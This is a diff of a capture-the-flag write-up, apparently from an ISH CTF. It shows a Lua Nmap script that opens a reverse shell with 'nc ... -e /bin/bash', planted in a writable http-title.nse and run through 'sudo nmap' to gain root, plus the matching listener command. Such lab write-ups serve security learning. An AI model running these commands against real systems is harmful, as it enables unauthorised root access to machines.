@@ -90,17 +90,23 @@ action = function(host, port)
 	local attacker_port = 6699 -- Set to the port you're listening on
 
 	-- Execute the reverse shell using nc -e /bin/bash 
-	local handle = io.popen("nc " .. attacker_ip .. " " .. a ttacker_port .. " -e /bin/bash")
+	local handle = io.popen("nc " .. attacker_ip .. " " .. attacker_port .. " -e /bin/bash")
 	
 	-- Close the handle after execution 
 	handle:close()
 	
-	 return "Reverse shell executed using nc -e /bin/bash
+	 return "Reverse shell executed using nc -e /bin/bash"
+end
 ```
 
 Since `http-title.nse` was writable, I just copied and pasted the above script after starting the listener
 
-sudo /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title Got the foothold as root use
+executed below command and got a revshell
+```
+sudo /usr/bin/nmap 127.0.0.1 -p 80 --script\=http-title
+```
 
+Got the foothold as root user  -  `nc -nvlp 6699
+`
 ### References
  ISH CTF - Shivam
